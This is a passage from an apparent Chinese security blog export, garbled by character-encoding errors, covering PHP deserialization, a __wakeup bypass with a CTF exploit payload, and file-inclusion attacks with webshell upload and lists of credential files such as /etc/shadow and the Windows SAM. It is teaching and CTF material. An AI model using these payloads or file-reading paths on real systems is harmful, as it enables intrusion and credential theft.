ttt3)\n\nå¸¸ç”¨é­”æ³•å‡½æ•°\n\n\nå¸¸ç”¨é­”æ³•å‡½æ•°\nå®šä¹‰\n\n\n\n__construct()\nåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ã€‚åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•\n\n\n__destruct()\nå’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡æ‰€åœ¨å‡½æ•°è°ƒç”¨å®Œæ¯•åæ‰§è¡Œ.å³å½“ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•\n\n\n__toString()\nå½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ã€‚\n\n\n__sleep()\nå½“è°ƒç”¨serialize()å‡½æ•°æ—¶ï¼ŒPHP å°†è¯•å›¾åœ¨åºåˆ—åŠ¨ä½œä¹‹å‰è°ƒç”¨è¯¥å¯¹è±¡çš„æˆå‘˜å‡½æ•° __sleep()ã€‚è¿™å°±å…è®¸å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰åšä»»ä½•æ¸…é™¤æ“ä½œ\n\n\n__wakeup()\nååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³•.å½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ __wakeup() æˆå‘˜å‡½æ•°\n\n\n__invoke()\næŠŠä¸€ä¸ªå®ä¾‹å¯¹è±¡å½“ä½œå‡½æ•°ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨\n\n\n__call()\nå½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚\n\n\n__get()\nåœ¨è°ƒç”¨ç§æœ‰å±æ€§çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ\n\n\n__isset()\nåœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘\n\n\n__unset()\nåœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘\n\n\n__wakeup() bypass\nåœ¨éœ€è¦å¯¹__wakeup() è¿›è¡Œç»•è¿‡çš„æ—¶å€™ï¼Œå¯ä»¥è®©åºåˆ—åŒ–ç»“æœä¸­ç±»å±æ€§çš„æ•°å€¼å¤§äºå…¶çœŸæ­£çš„æ•°å€¼è¿›è¡Œç»•è¿‡ï¼Œè¿™ä¸ªæ–¹å¼é€‚ç”¨äºPHP &lt; 5.6.25 å’Œ PHP&lt; 7.0.10\n&lt;?phpClass User&#123;  public $name=&quot;Bob&quot;;    function __destruct()&#123;    echo&quot;nameis Bob &lt;/br&gt;&quot;;  &#125;    function __wakeup()&#123;    echo&quot;exit&lt;/br&gt;&quot;;  &#125;&#125;@var_dump(unserialize($_POST[&quot;u&quot;]));\n\nPOST å‚æ•°O:4:â€Userâ€:1:{s:4:â€nameâ€;s:3:â€Bobâ€;}å¯ä»¥çœ‹åˆ°è¾“å‡ºæ˜¯ï¼š\nexitobject(User)[1] public &#x27;name&#x27; =&gt; string &#x27;Bob&#x27; (length=3)nameis Bob\n\nå¦‚æœåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸æƒ³è®©__wakeup() æ‰§è¡Œï¼Œå¯ä»¥å°† â€œUserâ€åçš„ 2 æ”¹ä¸ºä¸€ä¸ªæ¯”2 å¤§çš„æ•°å­—\nPOST å‚æ•°O:4:â€Userâ€:2:{s:4:â€nameâ€;s:3:â€Bobâ€;}ï¼š\nnameis Bobbooleanfalse\n\n\n[XCTF]Web â€“ Web_php_unserialize\né¢˜ç›®æºç ï¼š\n&lt;?php class Demo &#123;     private $file = &#x27;index.php&#x27;;    public function __construct($file) &#123;   #æ„é€ å‡½æ•°ï¼Œå¯¹ç±»çš„å˜é‡è¿›è¡Œåˆå§‹åŒ–        $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;  #é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœæœ‰ååºåˆ—åŒ–çš„ä½¿ç”¨ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆè°ƒç”¨è¿™ä¸ªæ–¹æ³•        if ($this-&gt;file != &#x27;index.php&#x27;) &#123;             //the secret is in the fl4g.php            $this-&gt;file = &#x27;index.php&#x27;;         &#125;     &#125; &#125;if (isset($_GET[&#x27;var&#x27;])) &#123;         #å­˜åœ¨$var                       $var = base64_decode($_GET[&#x27;var&#x27;]);   #å°†$var base64è§£ç å¹¶èµ‹å€¼$var    if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123;         die(&#x27;stop hacking!&#x27;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;\n\næ€è·¯ï¼šä¸»è¦æ˜¯æ­£åˆ™ç»•è¿‡å’Œ_wakeupï¼ˆï¼‰ç»•è¿‡\næ­£åˆ™åŒ¹é…ï¼šå› ä¸ºä¸èƒ½åŒ¹é…O:4è¿™ç§ï¼Œæˆ‘ä»¬å¯ä»¥O:+4ç»•è¿‡ï¼Œå› ä¸ºåœ¨urlç¼–ç ä¸­+ä¼šè¢«è½¬æ¢ä¸ºç©ºæ ¼\n__wakeup()ç»•è¿‡ï¼šè®©åºåˆ—åŒ–ç»“æœä¸­ç±»å±æ€§çš„æ•°å€¼å¤§äºå…¶çœŸæ­£çš„æ•°å€¼è¿›è¡Œç»•è¿‡\n&lt;?phpclass Demo &#123;    private $file = &#x27;fl4g.php&#x27;;&#125;$a= new demo;$b=serialize($a);  //echo  O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;$b=str_replace(&#x27;O:4&#x27;, &#x27;O:+4&#x27;,$b);//ç»•è¿‡preg_match$b= str_replace(&#x27;:1:&#x27;, &#x27;:2:&#x27;,$b);//ç»•è¿‡wakeupecho base64_encode($b);     ?&gt;\n\nå¾—åˆ°\n\nTzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;\n\nå†è¿›è¡Œgetä¼ å‚å³å¯\nphpåºåˆ—åŒ–è¡¥å……åŸç†ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚å½“è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚\nserialize() &#x2F;&#x2F;å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²unserialize() &#x2F;&#x2F;å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡\nè§¦å‘ï¼šunserialize å‡½æ•°çš„å˜é‡å¯æ§ï¼Œæ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³•ï¼š\n\næ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›phpåŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚\n\n__call() \t\t\t//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() \t\t\t//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set() \t\t\t//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() \t\t//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset()æˆ– empty()è§¦å‘__unset() \t\t//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨ unset()æ—¶è§¦å‘__invoke() \t\t//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘\n\næ„é€ å‡½æ•°ä¸ææ„å‡½æ•°\n__construct()å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚\n__destruct()ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚\n\nnewå‡ºä¸€ä¸ªæ–°çš„å¯¹è±¡æ—¶å°±ä¼šè°ƒç”¨__construct(),è€Œå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œä¾‹å¦‚ç¨‹åºé€€å‡ºæ—¶ï¼Œå°±ä¼šè°ƒç”¨__destruct()\nåºåˆ—åŒ–ç»†èŠ‚åºåˆ—åŒ–å«ä¹‰ä¾‹å¦‚ï¼šO:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:3:&quot;LEO&quot;;&#125; Oä»£è¡¨å¯¹è±¡ï¼›4ä»£è¡¨å¯¹è±¡åé•¿åº¦ï¼›2ä»£è¡¨2ä¸ªæˆå‘˜å˜é‡ï¼›å…¶ä½™å‚ç…§å¦‚ä¸‹\n\n\n\nç±»å‹\nç»“æ„\n\n\n\nString\ns:size:value;\n\n\nInteger\ni:value;\n\n\nBoolean\nb:value;(ä¿å­˜1æˆ–0)\n\n\nNull\nN;\n\n\nArray\na:size:\n\n\nObject\nO:strlen(object name):object name:object size:\n\n\npublicã€protectedã€privateä¸‹åºåˆ—åŒ–å¯¹è±¡çš„åŒºåˆ«php v7.xååºåˆ—åŒ–çš„æ—¶å€™å¯¹è®¿é—®ç±»åˆ«ä¸æ•æ„Ÿ\n\npublicå˜é‡ç›´æ¥å˜é‡åååºåˆ—åŒ–å‡ºæ¥\nprotectedå˜é‡\\x00 + * + \\x00 + å˜é‡åå¯ä»¥ç”¨S:5:&quot;\\00*\\00op&quot;æ¥ä»£æ›¿s:5:&quot;?*?op&quot;\nprivateå˜é‡\\x00 + ç±»å + \\x00 + å˜é‡å\n\nJAVAååºåˆ—åŒ–ä¸‹æ–¹çš„ç‰¹å¾å¯ä»¥ä½œä¸ºåºåˆ—åŒ–çš„æ ‡å¿—å‚è€ƒ:\n\nä¸€æ®µæ•°æ®ä»¥rO0ABå¼€å¤´ï¼Œä½ åŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯JAVAåºåˆ—åŒ–base64åŠ å¯†çš„æ•°æ®ã€‚\n\næˆ–è€…å¦‚æœä»¥acedå¼€å¤´ï¼Œé‚£ä¹ˆä»–å°±æ˜¯è¿™ä¸€æ®µjavaåºåˆ—åŒ–çš„16è¿›åˆ¶\n\n\n","categories":["Web"],"tags":["PHP","Java","unserialize"]},{"title":"æ–‡ä»¶åŒ…å«","url":"/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":"æ–‡ä»¶åŒ…å«å«ä¹‰æœ¬è´¨æ˜¯è¾“å…¥ä¸€æ®µç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶çš„è„šæœ¬æˆ–è€…ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œã€‚\n\nä»¥PHPä¸ºä¾‹ï¼Œå¸¸ç”¨çš„æ–‡ä»¶åŒ…å«\n\ninclude(),require(),include_once(),require_once()\n\nåŒºåˆ«\n\n\n*require():*æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½è­¦å‘Šï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ\n*include():*æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­è¿è¡Œ\n*require_once()ä¸require()ç±»ä¼¼:*å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ\n*include_once()ä¸include()ç±»ä¼¼:*å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ\n\n\nåˆ†æ\n\nä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæˆ‘ä»¬åˆ©ç”¨phpstudy,åœ¨ç½‘ç«™æ ¹ç›®å½•åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼š\né¦–å…ˆæ˜¯include.php\n&lt;?php\tinclude $_GET[&#x27;test&#x27;];?&gt;\n\næ¥ç€æ˜¯phpinfo.php\n&lt;?php\tphpinfo();?&gt;\n\næˆåŠŸè§£æ\n\n\nå°†phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºtxtåè¿›è¡Œè®¿é—®ï¼Œä¾ç„¶å¯ä»¥è§£æ:\n\n\nå°†phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºjpgæ ¼å¼ï¼Œä¹Ÿå¯ä»¥è§£æ:\n\n\nå¯ä»¥çœ‹å‡ºï¼Œinclude()å‡½æ•°å¹¶ä¸åœ¨æ„è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ï¼Œåªè¦æœ‰phpä»£ç ï¼Œéƒ½ä¼šè¢«è§£æå‡ºæ¥ã€‚\nä¸Šä¼ äº†ä¸€jpgæ ¼å¼çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå¦‚æœç½‘ç«™æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œjpgæ–‡ä»¶å°±å¯ä»¥è¢«å½“åšphpæ–‡ä»¶è§£æï¼Œæ‰€ä»¥è¿™å°±æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´é€šå¸¸é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨ã€‚\næœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)èƒ½å¤Ÿæ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œæˆ‘ä»¬ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)\n\n\nåŒæ—¶ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥ä»£ç ï¼Œè¯»å–ä¸€äº›æœ¬åœ°ç³»ç»Ÿçš„æ•æ„Ÿä¿¡æ¯\nä¾‹å¦‚ï¼šC:\\Windows\\system.ini\n\nä½¿ç”¨ç»åœ°è·¯å¾„ç›´æ¥è¯»å–:\n\nlocalhost/include.php?filename=C:\\Windows\\system.ini\n\nä½¿ç”¨ç›¸å¯¹è·¯å¾„è¿›è¡Œè¯»å–:\n\nâ€‹\t./ è¡¨ç¤ºå½“å‰è·¯å¾„\nâ€‹\t../ è¡¨ç¤ºä¸Šä¸€çº§è·¯å¾„ä½ç½®\nä¾‹å¦‚å½“å‰é¡µé¢æ‰€åœ¨è·¯å¾„ä¸ºC:\\Apache24\\htdocs\\ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨..&#x2F;é€€åˆ°Cç›˜å†è¿›è¡Œè®¿é—®ï¼Œæ„é€ è·¯å¾„å¦‚ä¸‹ï¼š../../windows/system.ini\n\nå¸¸è§çš„æ•æ„Ÿç›®å½•ä¿¡æ¯è·¯å¾„:\n\nWindowsç³»ç»Ÿ:\n\nC:\\boot.ini &#x2F;&#x2F;æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬\nC:\\windows\\system32\\inetsrv\\MetaBase.xml &#x2F;&#x2F;IISé…ç½®æ–‡ä»¶\nC:\\windows\\repair\\sam &#x2F;&#x2F;å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç \nC:\\ProgramFiles\\mysql\\my.ini &#x2F;&#x2F;Mysqlé…ç½®\nC:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD &#x2F;&#x2F;MySQL rootå¯†ç \nC:\\windows\\php.ini &#x2F;&#x2F;phpé…ç½®ä¿¡æ¯\n\nLinux&#x2F;Unixç³»ç»Ÿ:\n\n&#x2F;etc&#x2F;password &#x2F;&#x2F;è´¦æˆ·ä¿¡æ¯\n&#x2F;etc&#x2F;shadow &#x2F;&#x2F;è´¦æˆ·å¯†ç ä¿¡æ¯\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2é»˜è®¤é…ç½®æ–‡ä»¶\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;è™šæ‹Ÿç½‘ç«™é…ç½®\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHPç›¸å…³é…ç½®\n&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apacheé…ç½®æ–‡ä»¶\n&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysqlé…ç½®æ–‡ä»¶\n\nLFIæ¼æ´åˆ©ç”¨æŠ€å·§\né…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨\n\næœ‰æ—¶å€™æˆ‘ä»¬æ‰¾ä¸åˆ°æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ— æ³•ä¸Šä¼ webshellï¼Œå¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ ¼å¼çš„webshellåˆ°æœåŠ¡å™¨ï¼Œå†åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œè§£æã€‚\nä¾‹é¢˜ï¼šDVWA File Upload\næºç ï¼š\n&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );    // Can we move the file to the upload folder?    if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123;        // No        echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;    &#125;    else &#123;        // Yes!        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;    &#125;&#125;?&gt;\n\nç®€å•ä»‹ç»ä¸€ä¸‹è§£é¢˜æ€è·¯ï¼š\nå¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å†…å®¹æ²¡æœ‰åšä»»ä½•çš„æ£€æŸ¥ã€è¿‡æ»¤ï¼Œå­˜åœ¨æ˜æ˜¾çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œç”Ÿæˆä¸Šä¼ è·¯å¾„åï¼ŒæœåŠ¡å™¨ä¼šæ£€æŸ¥æ˜¯å¦ä¸Šä¼ æˆåŠŸå¹¶è¿”å›ç›¸åº”æç¤ºä¿¡æ¯ã€‚\nä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶é€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥çˆ†ç ´ç›®å½•ï¼š\n\n\nåŒ…å«Apacheæ—¥å¿—æ–‡ä»¶\n\nåˆ©ç”¨æ¡ä»¶:\n\nå¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»\nçŸ¥é“æ—¥å¿—æ–‡ä»¶å­˜å‚¨ç›®å½•\n\næ³¨æ„:\n\nä¸€èˆ¬æƒ…å†µä¸‹æ—¥å¿—å­˜å‚¨ç›®å½•ä¼šè¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶(httpd.conf,nginx,conf,â€¦â€¦)æˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥\næ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§ï¼Œæˆ–è€…å†…å®¹æ ¼å¼\n\nåœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥access.logï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥error.logï¼Œæ—¥å¿—æ–‡ä»¶å¦‚ä¸‹:\n\næ­£å¸¸è®¿é—®ç½‘é¡µæ—¶ï¼Œaccessæ—¥å¿—ä¼šè¿›è¡Œè®°å½•ï¼Œå¦‚ä¸‹å›¾è®°å½•æ‰€ç¤ºï¼š\n\nåŒ…å«sessionæ–‡ä»¶å¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚\nåˆ©ç”¨æ¡ä»¶:\n\næ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡\nSessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„\n\nphpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚\n\nsessionå¸¸è§å­˜å‚¨è·¯å¾„:\n\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID\nsessionæ–‡ä»¶æ ¼å¼:sess_[phpsessid],è€Œphpsessidåœ¨å‘é€çš„è¯·æ±‚çš„cookieå­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚\n\nåŒ…å«ä¸´æ—¶æ–‡ä»¶phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨&#x2F;tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\\windows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤å‰ï¼Œå¯ä»¥åˆ©ç”¨æ—¶é—´ç«äº‰çš„æ–¹å¼åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚\nç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„æ˜¯éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowsä¸‹åªæœ‰65535ç§ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚\nå¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚\nè¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)å¦‚æœPHPçš„é…ç½®é€‰é¡¹allow_url_includeã€allow_url_fopençŠ¶æ€ä¸ºONçš„è¯ï¼Œåˆ™include&#x2F;requireå‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´è¢«ç§°ä¸ºè¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)\n\né¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç include.php\n&lt;?php\t$path=$_GET[&#x27;path&#x27;];\tinclude($path . &#x27;/phpinfo.php&#x27;);?&gt;\n\n127.0.0.1/include.php/path=siteè®¿é—®æœ¬åœ°siteç›®å½•ä¸‹çš„phpinfo.phpæ–‡ä»¶:\nè¯¥é¡µé¢å¹¶æ²¡æœ‰å¯¹$pathåšä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚\næˆ‘ä»¬åœ¨è¿œç«¯WebæœåŠ¡å™¨&#x2F;site&#x2F;ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtest.phpæ–‡ä»¶ï¼Œå†…å®¹ä¸ºphpinfo()ï¼Œåˆ©ç”¨æ¼æ´å»è¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚\nä½†æ˜¯ä»£ç ä¼šç»™æˆ‘ä»¬è¾“å…¥çš„è·¯å¾„åé¢åŠ ä¸Šâ€™&#x2F;phpinfo.phpâ€™åç¼€ï¼Œå¦‚æœphpç‰ˆæœ¬å°äº5.3.4ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨%00æˆªæ–­ï¼Œè¿™é‡Œphpç‰ˆæœ¬ä¸º7.3.4ï¼Œä¸é€‚ç”¨ã€‚\nè¿˜æœ‰ä¸€ç§æˆªæ–­æ–¹æ³•å°±æ˜¯?å·æˆªæ–­ï¼Œåœ¨è·¯å¾„åé¢è¾“å…¥?å·ï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸º?å·åé¢çš„å†…å®¹ä¸ºGETæ–¹æ³•ä¼ é€’çš„å‚æ•°ï¼ŒæˆåŠŸè¯»å–test.phpå¦‚ä¸‹ï¼š\nå¦‚æœtest.phpæ˜¯æ¶æ„çš„webshellæ–‡ä»¶ï¼Œé‚£ä¹ˆåˆ©ç”¨è¯¥æ¼æ´å°±å¯ä»¥è·å–åˆ°æœåŠ¡å™¨æƒé™ã€‚\nPHPä¼ªåè®®PHPå†…ç½®äº†å¾ˆå¤šURLé£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼fopen()ã€copy()ã€file_exists()å’Œfilesize()çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°\nå¦‚ä¸‹æ‰€ç¤º\n1.file:&#x2F;&#x2F;åè®®file:&#x2F;&#x2F; ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“file:&#x2F;&#x2F; 